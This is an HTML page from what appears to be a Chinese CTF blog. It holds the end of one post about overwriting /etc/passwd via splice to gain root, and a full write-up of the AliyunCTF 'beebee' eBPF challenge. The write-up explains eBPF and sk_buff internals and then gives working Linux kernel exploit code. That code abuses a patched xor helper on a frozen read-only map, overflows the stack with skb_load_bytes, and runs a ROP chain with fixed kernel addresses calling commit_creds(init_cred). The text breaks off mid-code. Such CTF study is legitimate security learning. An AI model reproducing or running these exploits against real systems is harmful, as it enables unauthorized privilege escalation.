class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_NUM; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (write(pipe_fd[i][<span class="number">1</span>], r00t, <span class="built_in">strlen</span>(r00t)) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="四-疑难问题"><a href="#四-疑难问题" class="headerlink" title="四. 疑难问题"></a>四. 疑难问题</h2><p>​	由于busybox中加入了s这个权限，所以导致直接利用cpio进行打包的时候无法重新模拟，之后因此去除了suid的权限，但是会导致后面执行完覆盖&#x2F;etc&#x2F;passwd后无法使用su命令切换成root用户。</p>
<p><img src="/./images/alimem/1741173882219.jpg" alt="1741173882219"></p>
<p>​	但是可以通过cat &#x2F;etc&#x2F;passwd观察到，已经覆盖为指定内容的数据了。</p>
<p><img src="/./images/alimem/1741173955066.jpg" alt="1741173955066"></p>
<p>​	多出来的回车其实是之前的root多了一个x由于这里没有覆盖之前的&#x2F;n导致出现空行。</p>
<h2 id="五-总结"><a href="#五-总结" class="headerlink" title="五. 总结"></a>五. 总结</h2><p>​	通过本题的复现，我们可以清楚的掌握如何编写一个模拟内存分配的misc设备，并且如何防止多线程造成的问题（加入rcu写锁）,最后也就是如何利用splice函数实现不用泄露程序基地址就可以直接实现覆盖&#x2F;etc&#x2F;passwd，进而实现权限提升，本题难度不大，但是也掌握到了一定的漏洞利用方式。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2025/03/02/AliyunCTF-beebee/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="a2ure">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="a2ure's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2025/03/02/AliyunCTF-beebee/" class="post-title-link" itemprop="url">AliyunCTF--beebee</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2025-03-02 15:51:04 / Modified: 16:32:35" itemprop="dateCreated datePublished" datetime="2025-03-02T15:51:04+08:00">2025-03-02</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/recurrence/" itemprop="url" rel="index"><span itemprop="name">recurrence</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">Symbols count in article: </span>
              <span>3.1k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">Reading time &asymp;</span>
              <span>11 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="AliyunCTF–beebee"><a href="#AliyunCTF–beebee" class="headerlink" title="AliyunCTF–beebee"></a>AliyunCTF–beebee</h1><h2 id="一-背景介绍"><a href="#一-背景介绍" class="headerlink" title="一.背景介绍"></a>一.背景介绍</h2><h3 id="1-1-题目背景讲解"><a href="#1-1-题目背景讲解" class="headerlink" title="1.1 题目背景讲解"></a>1.1 题目背景讲解</h3><p>​	通过对于题目解包之后可以看到了提供了patch，通过patch可以观察到这是一个通过bpf helper注册了一个bpf_aliyunctf_xor的函数，原理也很简单，将一个指针通过异或2025赋值给另一个指针，并且通过对应的type可以看出对于第二个指针指定的类型时read only，因此漏洞点就是在这里，可以将一个不可写的地址进行写。因此接下来我们需要了解一下ebpf的原理。</p>
<p><img src="/images/beebee/1740726989847.jpg" alt="1740726989847"></p>
<h3 id="1-2-eBPF的背景知识"><a href="#1-2-eBPF的背景知识" class="headerlink" title="1.2 eBPF的背景知识"></a>1.2 eBPF的背景知识</h3><h4 id="1-2-1-eBPF汇编编程"><a href="#1-2-1-eBPF汇编编程" class="headerlink" title="1.2.1 eBPF汇编编程"></a>1.2.1 eBPF汇编编程</h4><p>​	eBPF（Extended Berkeley Packet Filter）是一种基于内核虚拟机的可编程技术，允许开发者通过在内核中安全运行<strong>沙盒化程序</strong>动态扩展内核功能，无需修改内核源码。其工作流程分为三个阶段：<strong>程序编写</strong>（可通过底层eBPF汇编指令或C等高级语言实现）、<strong>验证与加载</strong>（内核验证器确保代码安全无风险）、<strong>执行与交互</strong>（JIT编译后挂载至事件钩子，通过映射结构与用户态交互）。其中，eBPF汇编提供对指令级操作的<strong>精细控制</strong>，适合性能优化或特定场景突破；而高级语言（如C）通过编译器自动处理类型与边界检查，显著提升开发效率，更适合构建生产级工具（如网络监控、安全防御），两者在控制粒度与开发成本间形成互补。</p>
<p>​	之后介绍一下对于ebpf中eBPF汇编指令的介绍，eBPF 由 11 个 64 位寄存器、一个程序计数器和一个 512 字节的大 BPF 堆栈空间组成。寄存器被命名为r0- r10。操作模式默认为 64 位。64位的寄存器也可作32 位子寄存器使用，它们只能通过特殊的 ALU（算术逻辑单元）操作访问，使用低32位，高32位使用零填充。</p>
<p><img src="/images/beebee/1740739458259.jpg" alt="1740739458259"></p>
<p>​	具体的指令格式如下：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">bpf_insn</span> &#123;</span><br><span class="line"> __u8 code;  <span class="comment">/* opcode */</span></span><br><span class="line"> __u8 dst_reg:<span class="number">4</span>; <span class="comment">/* dest register */</span></span><br><span class="line"> __u8 src_reg:<span class="number">4</span>; <span class="comment">/* source register */</span></span><br><span class="line"> __s16 off;  <span class="comment">/* signed offset */</span></span><br><span class="line"> __s32 imm;  <span class="comment">/* signed immediate constant */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>​	对于函数调用通过BPF_CALL指令调用内核预定义的辅助函数（如map_lookup_elem）或自定义函数（如BPF_FUNC_aliyunctf_xor），参数需按约定存入r1-r5寄存器，代码中通过BPF_RAW_INSN调用辅助函数实现数据查找和加解密操作。</p>
<p><strong>1.2.2 高级语言实现eBPF编程</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/bpf.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bpf/bpf_helpers.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">SEC(<span class="string">&quot;tracepoint/syscalls/sys_enter_execve&quot;</span>)</span><br><span class="line"><span class="type">int</span> <span class="title function_">trace_execve</span><span class="params">(<span class="keyword">struct</span> bpf_sock_addr *ctx)</span> &#123;</span><br><span class="line">    <span class="type">char</span> msg[] = <span class="string">&quot;execve syscall triggered&quot;</span>;</span><br><span class="line">    bpf_trace_printk(msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">char</span> _license[] SEC(<span class="string">&quot;license&quot;</span>) = <span class="string">&quot;GPL&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>​	一个C语言编写的eBPF程序开发流程通常遵循以下步骤（以用户提供的execve跟踪程序为例）：首先需要包含内核头文件（如linux&#x2F;bpf.h）和辅助函数库（如bpf&#x2F;bpf_helpers.h），通过SEC()宏定义程序挂载点（示例中为tracepoint&#x2F;syscalls&#x2F;sys_enter_execve），并在处理函数中实现核心逻辑——本例使用bpf_trace_printk()向内核调试日志输出触发信息，同时必须声明GPL许可证（char _license[]）以满足内核验证要求。该程序实现了对execve系统调用的动态监控功能，当进程执行新程序时，eBPF程序会被触发并记录事件。除系统调用跟踪外，eBPF还可实现网络包过滤（如XDP程序优化网络转发）、性能分析（通过BPF_PERF_OUTPUT映射实时统计CPU&#x2F;内存指标）、安全防护（如检测异常进程行为），以及容器环境下的资源监控（通过cgroup挂载点关联容器ID）。开发者还可结合BPF_MAP_TYPE_HASH等数据结构实现更复杂的状态跟踪，或通过kprobe&#x2F;uprobe挂钩内核&#x2F;用户空间函数进行深度分析。</p>
<h3 id="1-3-sk-buff"><a href="#1-3-sk-buff" class="headerlink" title="1.3 sk_buff"></a>1.3 sk_buff</h3><p>​	题目栈溢出主要是通过利用BPF_FUNC_skb_load_bytes函数实现对于传入的skb包的内容转存到某片内存区域，因此我们需要了解一下这里的sk_buff，在linux的网络中有很重要的地位。下图展示了对应sk_buff中的存储数据指针信息。</p>
<p><img src="/images/beebee/1740816536277.jpg" alt="1740816536277"></p>
<ol>
<li>sk_buff结构数据区刚被申请好，此时 head 指针、data 指针、tail 指针都是指向同一个地方。head 指针和 end 指针指向的位置一直都不变，而对于数据的变化和协议信息的添加都是通过 data 指针和 tail 指针的改变来表现的。</li>
<li>开始准备存储应用层下发过来的数据，通过调用函数 skb_reserve() 来使 data 指针和 tail 指针同时向下移动，空出一部分空间来为后期添加协议信息。</li>
<li>开始存储数据了，通过调用函数 skb_put() 来使 tail 指针向下移动空出空间来添加数据，此时 skb-&gt;data 和 skb-&gt;tail 之间存放的都是数据信息，无协议信息。</li>
<li>这时就开始调用函数 skb_push() 来使 data 指针向上移动，空出空间来添加各层协议信息。直到最后到达二层，添加完帧头然后就开始发包了。</li>
</ol>
<p>​	因此对于上述来说我们通过伪造对应的data数据段就可以最终复制到我们指定的内存区域，但是在具体操作的时候会发现，在利用BPF_PROG_TYPE_SOCKET_FILTER的eBPF的prog_type时，利用BPF_PROG_TEST_RUN测试运行时的数据复制会在测试数据之前的0xe的大小开始复制，通过上述推测，应当是存储MAC的数据帧头包含源&#x2F;目的MAC地址和协议类型。此时对应的sk_buff的结构如下：</p>
<p><img src="/images/beebee/1740817850319.jpg" alt="1740817850319"></p>
<p><img src="/images/beebee/1740817881785.jpg" alt="1740817881785"></p>
<p>​	因此通过观察可以发现协议部分一共有0x4e大小的内容，通过test.data_in可以模拟以太网数据包，从data数据前0xe大小的地址开始进行复制内存。</p>
<h3 id="1-4-总结"><a href="#1-4-总结" class="headerlink" title="1.4 总结"></a>1.4 总结</h3><p>​	自此已经基本了解了eBPF可以实现那些功能并且了解到具体的原理，利用这些背景就可以实现后面的攻击利用了，主要就是通过利用对于只读的map进行写，构造出超出aBPF预期的行为，最终实现越界写，构造栈溢出，最终实现权限提升。</p>
<h2 id="二-漏洞利用"><a href="#二-漏洞利用" class="headerlink" title="二. 漏洞利用"></a>二. 漏洞利用</h2><h3 id="2-1-题目环境解析"><a href="#2-1-题目环境解析" class="headerlink" title="2.1 题目环境解析"></a>2.1 题目环境解析</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-x86_64  /</span><br><span class="line">-m 512M  /</span><br><span class="line">-smp 2 /</span><br><span class="line">-kernel bzImage    /</span><br><span class="line">-append &quot;console=ttyS0 quiet panic=-1 nokaslr sysctl.kernel.io_uring_disabled=1 sysctl.kernel.dmesg_restrict=1 sysctl.kernel.kptr_restrict=2 sysctl.kernel.unprivileged_bpf_disabled=0&quot;     /</span><br><span class="line">-initrd rootfs.cpio /</span><br><span class="line">-drive file=./flag,if=virtio,format=raw,readonly=on /</span><br><span class="line">-nographic  /</span><br><span class="line">-net nic,model=e1000 /</span><br><span class="line">-no-reboot /</span><br><span class="line">-monitor /dev/null</span><br></pre></td></tr></table></figure>

<p>​	根据上述启动脚本，我们可以看到并没有很多保护，并且也没有kalsr，因此只需要对于基地址进行rop就可以完成整个攻击流程。</p>
<h3 id="2-2-初始化设置只读map"><a href="#2-2-初始化设置只读map" class="headerlink" title="2.2 初始化设置只读map"></a>2.2 初始化设置只读map</h3><p>​	首先观察漏洞我们可以发现，这里主要是通过对于只读的地址实现写的漏洞，因此最先就是创建一个只读的map，之后利用漏洞函数bpf_aliyunctf_xor，实现对于可读的内存覆盖，首先为了创建一个只读的地址区域，先创建了一个map。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">attr</span> =</span> &#123;&#125;;</span><br><span class="line">    attr.map_type = BPF_MAP_TYPE_ARRAY;</span><br><span class="line">    attr.key_size = <span class="number">4</span>;</span><br><span class="line">    attr.value_size = <span class="number">8</span>;</span><br><span class="line">    attr.max_entries = <span class="number">1</span>;</span><br><span class="line">    attr.map_flags = BPF_F_RDONLY_PROG;</span><br><span class="line">    array_map_fd = SYSCHK(syscall(SYS_bpf, BPF_MAP_CREATE, &amp;attr, <span class="keyword">sizeof</span>(attr)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​	之后就是初始化这个map的内容</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">        <span class="type">int</span> key = <span class="number">0</span>;</span><br><span class="line">        <span class="type">char</span> value[<span class="number">8</span>] = &#123;&#125;;</span><br><span class="line">        *(<span class="type">long</span> <span class="type">long</span>*)&amp;value[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">        <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">attr</span> =</span> &#123;&#125;;</span><br><span class="line">        attr.map_fd = array_map_fd;</span><br><span class="line">        attr.key = (<span class="type">size_t</span>)&amp;key;</span><br><span class="line">        attr.value = (<span class="type">size_t</span>)&amp;value;</span><br><span class="line">        SYSCHK(syscall(SYS_bpf, BPF_MAP_UPDATE_ELEM, &amp;attr, <span class="keyword">sizeof</span>(attr)));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>​	之后就是讲这个map设置为只读的map</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">attr</span> =</span> &#123;&#125;;</span><br><span class="line">    attr.map_fd = array_map_fd;</span><br><span class="line">    SYSCHK(syscall(SYS_bpf, BPF_MAP_FREEZE, &amp;attr, <span class="keyword">sizeof</span>(attr)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​	自此就已经完成了对于创建一个只读的map内存地址区域，之后就是需要利用这个只读的map创建一个非预期的数据内容（超出本身的预期值大小），最终利用这个内容调用bpf_skb_load_bytes函数，就可以实现出栈溢出的攻击。</p>
<h3 id="2-3-通过漏洞设置非预期数值实现栈溢出攻击"><a href="#2-3-通过漏洞设置非预期数值实现栈溢出攻击" class="headerlink" title="2.3 通过漏洞设置非预期数值实现栈溢出攻击"></a>2.3 通过漏洞设置非预期数值实现栈溢出攻击</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_insn</span> <span class="title">prog</span>[] =</span> &#123;</span><br><span class="line">    BPF_MOV64_REG(BPF_REG_9, BPF_REG_1),   <span class="comment">// mov64 r9, r1 (保存上下文指针)</span></span><br><span class="line">    BPF_ST_MEM(BPF_DW, BPF_REG_10, <span class="number">-16</span>, <span class="number">0</span>),<span class="comment">// [fp-16]=0 (栈空间预置零)</span></span><br><span class="line">    BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),  <span class="comment">// mov64 r2, fp</span></span><br><span class="line">    BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, <span class="number">-16</span>),<span class="comment">// r2 -= 16 (计算map key地址)</span></span><br><span class="line">    BPF_LD_MAP_FD(BPF_REG_1, array_map_fd),<span class="comment">// r1 = map_fd (加载BPF map文件描述符)</span></span><br><span class="line">    BPF_RAW_INSN(BPF_JMP | BPF_CALL, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, BPF_FUNC_map_lookup_elem),<span class="comment">// map查找调用</span></span><br><span class="line">    BPF_JMP_IMM(BPF_JNE, BPF_REG_0, <span class="number">0</span>, <span class="number">1</span>),<span class="comment">// if r0!=0 skip next (校验map查找结果)</span></span><br><span class="line">    BPF_EXIT_INSN(),                       <span class="comment">// exit (查找失败直接退出)[2](@ref)</span></span><br><span class="line">    BPF_MOV64_REG(BPF_REG_3, BPF_REG_0),   <span class="comment">// mov64 r3, r0 (保存查找到的value指针)</span></span><br><span class="line">    BPF_MOV64_REG(BPF_REG_7, BPF_REG_0),   <span class="comment">// mov64 r7, r0 (备份value指针)</span></span><br><span class="line">    BPF_LDX_MEM(BPF_DW, BPF_REG_6, BPF_REG_7, <span class="number">0</span>),<span class="comment">// r6 = [r7+0] (加载map存储值)</span></span><br><span class="line">    BPF_ST_MEM(BPF_W, BPF_REG_10, <span class="number">-0x18</span>, <span class="number">2025</span> ^ (<span class="number">0x80</span>)),<span class="comment">// [fp-24]=2025^0x80 (异或运算存储)</span></span><br><span class="line">    BPF_ST_MEM(BPF_W, BPF_REG_10, <span class="number">-0x14</span>, <span class="number">0</span>),<span class="comment">// [fp-20]=0 (栈空间初始化)</span></span><br><span class="line">    BPF_MOV64_REG(BPF_REG_1, BPF_REG_10),  <span class="comment">// mov64 r1, fp</span></span><br><span class="line">    BPF_ALU64_IMM(BPF_ADD, BPF_REG_1, <span class="number">-0x18</span>),<span class="comment">// r1 -= 24 (计算异或参数地址)</span></span><br><span class="line">    BPF_MOV64_IMM(BPF_REG_2, <span class="number">8</span>),           <span class="comment">// mov64 r2, 8 (设置参数长度)</span></span><br><span class="line">    BPF_RAW_INSN(BPF_JMP | BPF_CALL, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, BPF_FUNC_aliyunctf_xor),<span class="comment">// 调用自定义异或函数</span></span><br><span class="line">    BPF_MOV64_REG(BPF_REG_1, BPF_REG_9),   <span class="comment">// mov64 r1, r9 (恢复上下文指针)</span></span><br><span class="line">    BPF_MOV64_IMM(BPF_REG_2, <span class="number">0</span>),           <span class="comment">// mov64 r2, 0 (设置偏移量)</span></span><br><span class="line">    BPF_MOV64_REG(BPF_REG_3, BPF_REG_10),  <span class="comment">// mov64 r3, fp</span></span><br><span class="line">    BPF_ALU64_IMM(BPF_ADD, BPF_REG_3, <span class="number">-8</span>), <span class="comment">// r3 -= 8 (计算存储地址)</span></span><br><span class="line">    BPF_LDX_MEM(BPF_DW, BPF_REG_4, BPF_REG_7, <span class="number">0</span>),<span class="comment">// r4 = [r7+0] (再次加载map值)</span></span><br><span class="line">    BPF_RAW_INSN(BPF_JMP | BPF_CALL, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, BPF_FUNC_skb_load_bytes),<span class="comment">// 加载数据包字节</span></span><br><span class="line">    BPF_EXIT_INSN()                        <span class="comment">// exit (程序退出)</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>​	首先就是利用上述的eBPF的汇编指令就可以实现上述效果，接下来分部进行解释，首先对于第一个指令主要时保存r1寄存器里面的值，由于时利用BPF_PROG_TYPE_SOCKET_FILTER的协议，因此r1中存储的就是后面调用skb_load_bytes需要存储信息的sk_buff结构体指针。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BPF_MOV64_REG(BPF_REG_9, BPF_REG_1),   <span class="comment">// mov64 r9, r1 (保存上下文指针)</span></span><br></pre></td></tr></table></figure>

<p>​	之后利用下面这部分代码可以实现对于map_lookup_elem函数找到对应key的value指针，也就是后面希望修改只读区域的指针。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">BPF_ST_MEM(BPF_DW, BPF_REG_10, <span class="number">-16</span>, <span class="number">0</span>),<span class="comment">// [fp-16]=0 (栈空间预置零)</span></span><br><span class="line">BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),  <span class="comment">// mov64 r2, fp</span></span><br><span class="line">BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, <span class="number">-16</span>),<span class="comment">// r2 -= 16 (计算map key地址)</span></span><br><span class="line">BPF_LD_MAP_FD(BPF_REG_1, array_map_fd),<span class="comment">// r1 = map_fd (加载BPF map文件描述符)</span></span><br><span class="line">BPF_RAW_INSN(BPF_JMP | BPF_CALL, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, BPF_FUNC_map_lookup_elem),<span class="comment">// map查找调用</span></span><br></pre></td></tr></table></figure>

<p>​	接下来就是利用漏洞函数aliyunctf_xor实现对于非预期的数值构造，利用刚刚获得到的value指针，我们可以设置值为0x80也就是后面复制skb_load_bytes的字节数，按照可读进行预测，这里应该不会发生改变还是0但是由于存在漏洞导致编程0x80。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">BPF_MOV64_REG(BPF_REG_3, BPF_REG_0),   <span class="comment">// mov64 r3, r0 (保存查找到的value指针)</span></span><br><span class="line">   BPF_MOV64_REG(BPF_REG_7, BPF_REG_0),   <span class="comment">// mov64 r7, r0 (备份value指针)</span></span><br><span class="line">   BPF_LDX_MEM(BPF_DW, BPF_REG_6, BPF_REG_7, <span class="number">0</span>),<span class="comment">// r6 = [r7+0] (加载map存储值)</span></span><br><span class="line">   BPF_ST_MEM(BPF_W, BPF_REG_10, <span class="number">-0x18</span>, <span class="number">2025</span> ^ (<span class="number">0x80</span>)),<span class="comment">// [fp-24]=2025^0x80 (异或运算存储)</span></span><br><span class="line">   BPF_ST_MEM(BPF_W, BPF_REG_10, <span class="number">-0x14</span>, <span class="number">0</span>),<span class="comment">// [fp-20]=0 (栈空间初始化)</span></span><br><span class="line">   BPF_MOV64_REG(BPF_REG_1, BPF_REG_10),  <span class="comment">// mov64 r1, fp</span></span><br><span class="line">   BPF_ALU64_IMM(BPF_ADD, BPF_REG_1, <span class="number">-0x18</span>),<span class="comment">// r1 -= 24 (计算异或参数地址)</span></span><br><span class="line">   BPF_MOV64_IMM(BPF_REG_2, <span class="number">8</span>),           <span class="comment">// mov64 r2, 8 (设置参数长度)</span></span><br><span class="line">   BPF_RAW_INSN(BPF_JMP | BPF_CALL, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, BPF_FUNC_aliyunctf_xor),<span class="comment">// 调用自定义异或函数</span></span><br></pre></td></tr></table></figure>

<p>​	最后就是调用skb_load_bytes把data复制到指定的内存区域，这里指定的地址时rbp - 8的地址，因此我们需要在之前说的MAC帧头0xe的基础上加上0x10大小的数据区域就可以控制最终的返回值，覆盖成commit_creds(init_cred())就可以实现权限提升了。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">BPF_MOV64_REG(BPF_REG_1, BPF_REG_9),   <span class="comment">// mov64 r1, r9 (恢复上下文指针)</span></span><br><span class="line">BPF_MOV64_IMM(BPF_REG_2, <span class="number">0</span>),           <span class="comment">// mov64 r2, 0 (设置偏移量)</span></span><br><span class="line">BPF_MOV64_REG(BPF_REG_3, BPF_REG_10),  <span class="comment">// mov64 r3, fp</span></span><br><span class="line">BPF_ALU64_IMM(BPF_ADD, BPF_REG_3, <span class="number">-8</span>), <span class="comment">// r3 -= 8 (计算存储地址)</span></span><br><span class="line">BPF_LDX_MEM(BPF_DW, BPF_REG_4, BPF_REG_7, <span class="number">0</span>),<span class="comment">// r4 = [r7+0] (再次加载map值)</span></span><br><span class="line">BPF_RAW_INSN(BPF_JMP | BPF_CALL, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, BPF_FUNC_skb_load_bytes),<span class="comment">// 加载数据包字节</span></span><br><span class="line">BPF_EXIT_INSN()                        <span class="comment">// exit (程序退出)</span></span><br></pre></td></tr></table></figure>

<p>​	之后就是利用BPF_PROG_TYPE_SOCKET_FILTER进行test run,并且存储好伪造的数据也就是在30（0xe + 0x10）这里，自此就完成了整个攻击的全部流程。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Load BPF program</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">prog_attr</span> =</span> &#123;</span><br><span class="line">        .prog_type = BPF_PROG_TYPE_SOCKET_FILTER,</span><br><span class="line">        .insn_cnt = <span class="keyword">sizeof</span>(prog) / <span class="keyword">sizeof</span>(<span class="keyword">struct</span> bpf_insn),</span><br><span class="line">        .insns = (<span class="type">uint64_t</span>)prog,</span><br><span class="line">        .log_buf = (<span class="type">uint64_t</span>)log_buf,</span><br><span class="line">        .log_size = LOG_BUF_SZ,</span><br><span class="line">        .log_level = <span class="number">1</span> | <span class="number">2</span>,</span><br><span class="line">        .license = (<span class="type">uint64_t</span>)<span class="string">&quot;GPL&quot;</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">int</span> prog_fd = SYSCHK(syscall(SYS_bpf, BPF_PROG_LOAD, &amp;prog_attr, <span class="keyword">sizeof</span>(prog_attr)));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Prepare ROP chain</span></span><br><span class="line">    <span class="type">char</span> data_buf[<span class="number">4096</span>] = &#123;&#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> __<span class="title">sk_buff</span> <span class="title">md</span> =</span> &#123;&#125;;</span><br><span class="line">    <span class="type">size_t</span>* rop_chain = (<span class="type">size_t</span>*)&amp;data_buf[<span class="number">30</span>];</span><br><span class="line">    *rop_chain++ = <span class="number">0xffffffff8130d3de</span>; <span class="comment">// pop rdi; ret</span></span><br><span class="line">    *rop_chain++ = <span class="number">0xffffffff82a52fa0</span>; <span class="comment">// init_cred</span></span><br><span class="line">    *rop_chain++ = <span class="number">0xffffffff810c3c50</span>; <span class="comment">// commit_creds</span></span><br><span class="line">    *rop_chain++ = <span class="number">0xffffffff8108e620</span>; <span class="comment">// vfork</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Execute BPF program</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">test_run_attr</span> =</span> &#123;</span><br><span class="line">        .test.prog_fd = prog_fd,</span><br><span class="line">        .test.data_size_in = <span class="number">1024</span>,</span><br><span class="line">        .test.data_in = (<span 